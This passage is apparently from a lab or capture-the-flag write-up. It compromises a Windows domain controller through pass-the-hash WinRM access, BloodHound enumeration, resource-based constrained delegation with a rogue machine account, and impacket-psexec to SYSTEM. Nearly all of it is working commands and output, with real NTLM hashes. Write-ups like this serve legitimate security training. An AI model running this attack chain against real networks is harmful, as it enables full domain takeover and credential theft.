WINRM       192.168.120.181 5985   RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f
WINRM       192.168.120.181 5985   RESOURCEDC       [-] resourced.local\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0
...
WINRM       192.168.120.181 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:3004b16f88664fbebfcb9ed272b0565b
WINRM       192.168.120.181 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:3105e0f6af52aba8e11d19f27e487e45
WINRM       192.168.120.181 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:204410cc5a7147cd52a04ddae6754b0c
WINRM       192.168.120.181 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
We have a working hash for the user L.Livingstone. Let's use these to connect using evil-winrm.

┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.120.181 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
...
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami
resourced\l.livingstone
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> 
Success! We now have shell access as the user L.Livingstone.

Escalation
Local Windows Enumeration
Let's start by uploading a copy of SharpHound.exe and running it.
```

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> upload /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
Info: Uploading /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe to C:\Users\L.Livingstone\Documents\SharpHound.exe                                                                                          

                                                             
Data: 1110696 bytes of 1110696 bytes copied

Info: Upload successful!
```

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\SharpHound.exe -c all
------------------------------------------------
Initializing SharpHound at 12:08 PM on 1/10/2022
------------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain RESOURCED.LOCAL using path CN=Schema,CN=Configuration,DC=resourced,DC=local
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 19 MB RAM
Status: 66 objects finished (+66 66)/s -- Using 26 MB RAM
Enumeration finished in 00:00:01.4459832
Compressing data to .\20220110120802_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 12:08 PM on 1/10/2022! Happy Graphing!
A zip file was created with the information collected by SharpHound.exe. Let's download it to our Kali host.

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> ls

<p><br/></p>

    Directory: C:\Users\L.Livingstone\Documents

<p><br/></p>

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/10/2022  12:08 PM           9343 20220110120802_BloodHound.zip
-a----        1/10/2022  12:08 PM          11781 N2NkZDYyMzItY2UxZi00N2ZkLTg4ZmQtNThlNjJlZDQ1NzJh.bin
-a----        1/10/2022  12:06 PM         833024 SharpHound.exe

<p><br/></p>

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> download 20220110120802_BloodHound.zip
Info: Downloading 20220110120802_BloodHound.zip to ./20220110120802_BloodHound.zip

                                                             
Info: Download successful!
Let's import this zip file into Bloodhound. We can quickly start up Bloodhound by using Docker.
```

```zsh
┌──(kali㉿kali)-[~]
└─$ sudo docker run -it \    
  -p 7474:7474 \
  -e DISPLAY=unix$DISPLAY \
  -v /tmp/.X11-unix:/tmp/.X11-unix \
  --device=/dev/dri:/dev/dri \
  -v ~/Desktop/bloodhound/data:/data \
  --name bloodhound belane/bloodhound
In the Bloodhound window, select "Upload Data" from the menu on the right and navigate to the zip file we downloaded from the target.

With our data imported, we can enumerate over the information, looking for anything we can use to elevate our access. Looking through the user domain permissions, we discover that L.Livingstone has "GenericAll" privilege on the domain controller.

Bloodhound screen

We may be able to abuse a Resource Based Constrained Delegation and gain full privileges over the domain controller.

Resource Based Constrained Delegation
Let's use our access with the l.livingstone account to create a new machine account on the domain. We can do with by using impacket-addcomputer.
```

```zsh
┌──(kali㉿kali)-[~]
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
We can verify that this machine account was added to the domain by using our evil-winrm session from before.

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> get-adcomputer attack

<p><br/></p>

DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local
DNSHostName       :
Enabled           : True
Name              : ATTACK
ObjectClass       : computer
ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9
SamAccountName    : ATTACK$
SID               : S-1-5-21-537427935-490066102-1511301751-3601
UserPrincipalName :
With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of rbcd.py and use it to set msDS-AllowedToActOnBehalfOfOtherIdentity on our new machine account.
```

```zsh
┌──(kali㉿kali)-[~]
└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  
...
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
[*] Initializing LDAP connection to 192.168.120.181
[*] Using resourced\l.livingstone account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
We can confirm that this was successful by using our evil-winrm session.
```

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity

Path Owner                  Access
---- -----                  ------
     BUILTIN\Administrators resourced\ATTACK$ Allow
```

```
We now need to get the administrator service ticket. We can do this by using impacket-getST with our privileged machine account.
```

```zsh
┌──(kali㉿kali)-[~]
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
This saved the ticket on our Kali host as Administrator.ccache. We need to export a new environment variable named KRB5CCNAME with the location of this file.
```

```zsh
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=./Administrator.ccache
Now, all we have to do is add a new entry in /etc/hosts to point resourcedc.resourced.local to the target IP address and run impacket-psexec to drop us into a system shell.
```

```zsh
┌──(kali㉿kali)-[~]
└─$ sudo sh -c 'echo "192.168.120.181 resourcedc.resourced.local" >> /etc/hosts'
```

```zsh
┌──(kali㉿kali)-[~]
└─$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file zZeQFeGQ.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service rEwK on resourcedc.resourced.local.....
[*] Starting service rEwK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.
 
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
Success! We now have system access on the target system.
```

</details>